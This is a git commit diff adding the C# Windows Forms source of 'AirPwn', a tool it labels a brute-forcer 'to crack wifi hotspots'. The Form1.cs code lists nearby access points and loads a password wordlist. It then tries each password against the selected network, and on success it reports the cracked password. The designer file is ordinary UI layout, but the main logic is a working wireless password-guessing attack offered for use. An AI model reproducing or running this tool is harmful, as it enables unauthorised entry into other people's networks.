45a7ac63b6592b325a1cb3c2a2fe6602699b0df7
Anonymous <132711888+K3rnel-Dev@users.noreply.github.com>
2023-05-15 03:56:58 +0530

    Released

---
+++ WiBf/Form1.Designer.cs
@@ -0,0 +1,230 @@
+﻿namespace WiBf
+{
+	partial class Form1
+	{
+		/// <summary>
+		/// Required designer variable.
+		/// </summary>
+		private System.ComponentModel.IContainer components = null;
+
+		/// <summary>
+		/// Clean up any resources being used.
+		/// </summary>
+		/// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+		protected override void Dispose(bool disposing)
+		{
+			if (disposing && (components != null))
+			{
+				components.Dispose();
+			}
+			base.Dispose(disposing);
+		}
+
+		#region Windows Form Designer generated code
+
+		/// <summary>
+		/// Required method for Designer support - do not modify
+		/// the contents of this method with the code editor.
+		/// </summary>
+		private void InitializeComponent()
+		{
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.listBox1 = new System.Windows.Forms.ListBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.linkLabel1 = new System.Windows.Forms.LinkLabel();
+            this.button2 = new System.Windows.Forms.Button();
+            this.openFileDialog1 = new System.Windows.Forms.OpenFileDialog();
+            this.label3 = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.label4 = new System.Windows.Forms.Label();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.button3 = new System.Windows.Forms.Button();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // listBox1
+            // 
+            this.listBox1.BackColor = System.Drawing.Color.Black;
+            this.listBox1.Cursor = System.Windows.Forms.Cursors.Default;
+            this.listBox1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.listBox1.ForeColor = System.Drawing.Color.Yellow;
+            this.listBox1.FormattingEnabled = true;
+            this.listBox1.ItemHeight = 15;
+            this.listBox1.Location = new System.Drawing.Point(12, 69);
+            this.listBox1.Name = "listBox1";
+            this.listBox1.Size = new System.Drawing.Size(173, 379);
+            this.listBox1.TabIndex = 0;
+            // 
+            // button1
+            // 
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Font = new System.Drawing.Font("Consolas", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.button1.ForeColor = System.Drawing.Color.Yellow;
+            this.button1.Location = new System.Drawing.Point(214, 436);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(177, 45);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "Crack";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Consolas", 14.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label1.ForeColor = System.Drawing.Color.Yellow;
+            this.label1.Location = new System.Drawing.Point(12, 20);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(180, 22);
+            this.label1.TabIndex = 2;
+            this.label1.Text = "AirPwn BruteForce";
+            this.label1.Click += new System.EventHandler(this.label1_Click);
+            // 
+            // label2
+            // 
+            this.label2.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label2.ForeColor = System.Drawing.Color.Yellow;
+            this.label2.Location = new System.Drawing.Point(210, 312);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(216, 85);
+            this.label2.TabIndex = 3;
+            this.label2.Text = "+---------------------+\r\nAirPwn is BruteForce-tool\r\nto crack wifi hotspots by\r\nK3" +
+    "RNEL-DEV\r\nhttps://github.com/K3rnel-Dev\r\n+----------------------+\r\n\r\n";
+            // 
+            // linkLabel1
+            // 
+            this.linkLabel1.ActiveLinkColor = System.Drawing.Color.Yellow;
+            this.linkLabel1.AutoSize = true;
+            this.linkLabel1.Font = new System.Drawing.Font("Lucida Console", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.linkLabel1.ForeColor = System.Drawing.Color.Yellow;
+            this.linkLabel1.LinkColor = System.Drawing.Color.Yellow;
+            this.linkLabel1.Location = new System.Drawing.Point(18, 42);
+            this.linkLabel1.Name = "linkLabel1";
+            this.linkLabel1.Size = new System.Drawing.Size(149, 11);
+            this.linkLabel1.TabIndex = 4;
+            this.linkLabel1.TabStop = true;
+            this.linkLabel1.Text = "Devolped By K3rnel";
+            this.linkLabel1.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel1_LinkClicked);
+            // 
+            // button2
+            // 
+            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button2.Font = new System.Drawing.Font("Consolas", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.button2.ForeColor = System.Drawing.Color.Yellow;
+            this.button2.Location = new System.Drawing.Point(214, 400);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(177, 30);
+            this.button2.TabIndex = 5;
+            this.button2.Text = "Wordlist Select";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // openFileDialog1
+            // 
+            this.openFileDialog1.FileName = "openFileDialog1";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(12, 489);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(0, 13);
+            this.label3.TabIndex = 6;
+            // 
+            // textBox1
+            // 
+            this.textBox1.BackColor = System.Drawing.Color.Black;
+            this.textBox1.ForeColor = System.Drawing.Color.Yellow;
+            this.textBox1.Location = new System.Drawing.Point(397, 12);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(29, 20);
+            this.textBox1.TabIndex = 7;
+            this.textBox1.Text = "5";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.BackColor = System.Drawing.Color.Transparent;
+            this.label4.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label4.ForeColor = System.Drawing.Color.Yellow;
+            this.label4.Location = new System.Drawing.Point(202, 15);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(189, 14);
+            this.label4.TabIndex = 8;
+            this.label4.Text = "Connection Check Delay (S)";
+            // 
+            // button3
+            // 
+            this.button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button3.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.button3.ForeColor = System.Drawing.Color.Yellow;
+            this.button3.Location = new System.Drawing.Point(12, 458);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(172, 23);
+            this.button3.TabIndex = 9;
+            this.button3.Text = "Rescan";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Image = global::WiBf.Properties.Resources.wifi;
+            this.pictureBox1.Location = new System.Drawing.Point(202, 69);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(225, 240);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
+            this.pictureBox1.TabIndex = 10;
+            this.pictureBox1.TabStop = false;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.AutoSize = true;
+            this.BackColor = System.Drawing.Color.Black;
+            this.ClientSize = new System.Drawing.Size(439, 529);
+            this.Controls.Add(this.pictureBox1);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.linkLabel1);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.listBox1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.Text = "AirPwn by K3rnel Dev";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+		}
+
+		#endregion
+
+		private System.Windows.Forms.ListBox listBox1;
+		private System.Windows.Forms.Button button1;
+		private System.Windows.Forms.Label label1;
+		private System.Windows.Forms.Label label2;
+		private System.Windows.Forms.LinkLabel linkLabel1;
+		private System.Windows.Forms.Button button2;
+		private System.Windows.Forms.OpenFileDialog openFileDialog1;
+		private System.Windows.Forms.Label label3;
+		private System.Windows.Forms.TextBox textBox1;
+		private System.Windows.Forms.Label label4;
+		private System.Windows.Forms.Timer timer1;
+		private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.PictureBox pictureBox1;
+    }
+}
+
---
+++ WiBf/Form1.cs
@@ -0,0 +1,264 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Windows.Forms;
+using System.Collections.ObjectModel;
+using System.Reflection;
+using System.Net;
+//---------------------------------------
+using SimpleWifi;
+using NativeWifi;
+
+
+/*
+v1.1.0 Update Notes (Released)
+	1. Added Multithreading
+	2. New Status Label
+	3. Ability to Change the Connection Check Delay 
+
+v1.2.0 Update Notes (Released)
+	1. Added password count (done / total)
+	2. Font Changes
+	3. Added Version Number to title label
+	3. Added Rescan button
+*/
+
+namespace WiBf
+{
+	public partial class Form1 : Form
+	{
+		private static Wifi wifi;
+		NativeWifi.WlanClient wlan = new NativeWifi.WlanClient();
+		List<string> passwords = new List<string>();
+		public string version = "v1.2.0";
+
+		public Form1()
+		{
+			InitializeComponent();
+		}
+
+		private void Form1_Load(object sender, EventArgs e)
+		{
+			wifi = new Wifi();
+			wifi.ConnectionStatusChanged += wifi_ConnectionStatusChanged;
+			linkLabel1.Links.Add(12, 7, "https://github.com/K3rnel-Dev");
+			label3.Text = "Status: idle";
+			label3.ForeColor = Color.Yellow;
+			label1.Text = "AirPwn " + version;
+			List();
+		}
+
+		private delegate void SetControlPropertyThreadSafeDelegate(
+		Control control,
+		string propertyName,
+		object propertyValue);
+
+		public static void SetControlPropertyThreadSafe(
+				Control control,
+				string propertyName,
+				object propertyValue)
+		{
+			if (control.InvokeRequired)
+			{
+				control.Invoke(new SetControlPropertyThreadSafeDelegate
+				(SetControlPropertyThreadSafe),
+				new object[] { control, propertyName, propertyValue });
+			}
+			else
+			{
+				control.GetType().InvokeMember(
+						propertyName,
+						BindingFlags.SetProperty,
+						null,
+						control,
+						new object[] { propertyValue });
+			}
+		}
+
+		private bool check(AccessPoint selectedAP)
+		{
+			Collection<String> connectedSsids = new Collection<string>();
+			if (WifiStatus.Connected.ToString() == "Connected")
+			{
+				foreach (NativeWifi.WlanClient.WlanInterface wlanInterface in wlan.Interfaces)
+				{
+					try
+					{
+						Wlan.Dot11Ssid ssid = wlanInterface.CurrentConnection.wlanAssociationAttributes.dot11Ssid;
+						connectedSsids.Add(new String(Encoding.ASCII.GetChars(ssid.SSID, 0, (int)ssid.SSIDLength)));
+					}
+					catch(Exception)
+					{
+						return false;
+					}
+				}
+				foreach (string ssid in connectedSsids)
+				{
+					if (selectedAP.Name == ssid)
+					{
+						return true;
+					}
+					else
+					{
+						return false;
+					}
+				}
+			}
+			return false;
+		}
+
+		public static bool CheckForInternetConnection()
+		{
+			try
+			{
+				using (var client = new WebClient())
+				using (var stream = client.OpenRead("http://www.google.com"))
+				{
+					return true;
+				}
+			}
+			catch
+			{
+				return false;
+			}
+		}
+
+		private IEnumerable<AccessPoint> List()
+		{
+			IEnumerable<AccessPoint> accessPoints = wifi.GetAccessPoints().OrderByDescending(ap => ap.SignalStrength);
+			foreach (AccessPoint ap in accessPoints)
+			{
+				listBox1.Items.Add(ap.Name);
+			}
+			return accessPoints;
+		}
+
+		private IEnumerable<AccessPoint> Scan()
+		{
+			IEnumerable<AccessPoint> accessPoints = wifi.GetAccessPoints().OrderByDescending(ap => ap.SignalStrength);
+			return accessPoints;
+		}
+
+		private static void wifi_ConnectionStatusChanged(object sender, WifiStatusEventArgs e)
+		{
+			Console.WriteLine("\nNew status: {0}", e.NewStatus.ToString());
+		}
+
+		private void OnConnectedComplete(bool success)
+		{
+			Console.WriteLine("\nOnConnectedComplete, success: {0}", success);
+		}
+
+		private void crack(AccessPoint selectedAP)
+		{
+			if (passwords.Count == 0)
+			{
+				MessageBox.Show("Please Select a Wordlist");
+				return;
+			}
+			int count = 1;
+			foreach (string pass in passwords)
+			{
+				SetControlPropertyThreadSafe(label3, "Text", "Status: Trying Password: "+pass+" ("+count+" / "+passwords.Count+")");count++;
+				// Auth
+				AuthRequest authRequest = new AuthRequest(selectedAP);
+				bool overwrite = true;
+
+				if (authRequest.IsPasswordRequired)
+				{
+					if (overwrite)
+					{
+						if (authRequest.IsUsernameRequired)
+						{
+							Console.Write("\r\nPlease enter a username: ");
+							authRequest.Username = Console.ReadLine();
+						}
+						authRequest.Password = pass;
+
+						if (authRequest.IsDomainSupported)
+						{
+							Console.Write("\r\nPlease enter a domain: ");
+							authRequest.Domain = Console.ReadLine();
+						}
+					}
+				}
+
+				selectedAP.ConnectAsync(authRequest, overwrite, OnConnectedComplete);
+				int i = Convert.ToInt32(textBox1.Text);
+				Thread.Sleep(i*1000);
+				if (check(selectedAP) == true && CheckForInternetConnection() == true)
+				{
+					SetControlPropertyThreadSafe(label3, "Text", "Status: Successfully Cracked: "+selectedAP.Name+" With Password: "+pass);
+					return;
+				}
+			}
+		}
+
+		private void button1_Click(object sender, EventArgs e)
+		{
+			try
+			{
+				var accessPoints = Scan();
+				AccessPoint selectedAP = null;
+
+				foreach (AccessPoint ap in accessPoints)
+				{
+					if (ap.Name == listBox1.SelectedItem.ToString())
+					{
+						selectedAP = ap;
+					}
+				}
+				Thread t = new Thread(() => crack(selectedAP));
+				t.IsBackground = true;
+				t.Start();
+			}
+			catch (Exception a)
+			{
+				MessageBox.Show(a.ToString());
+			}
+		}
+
+		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+		{
+			System.Diagnostics.Process.Start(e.Link.LinkData.ToString());
+		}
+
+		private void button2_Click(object sender, EventArgs e)
+		{
+			OpenFileDialog oFile = new OpenFileDialog();
+			openFileDialog1.InitialDirectory = "c:\\";
+			openFileDialog1.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
+			openFileDialog1.FilterIndex = 2;
+			openFileDialog1.RestoreDirectory = true;
+			string path;
+			if (oFile.ShowDialog() == DialogResult.OK)
+			{
+				path = oFile.FileName;
+				int counter = 0;
+				string line;
+				System.IO.StreamReader file = new System.IO.StreamReader(path);
+				while ((line = file.ReadLine()) != null)
+				{
+					passwords.Add(line);
+					counter++;
+				}
+				file.Close();
+			}
+		}
+
+		private void button3_Click(object sender, EventArgs e)
+		{
+			listBox1.Items.Clear();
+			List();
+		}
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
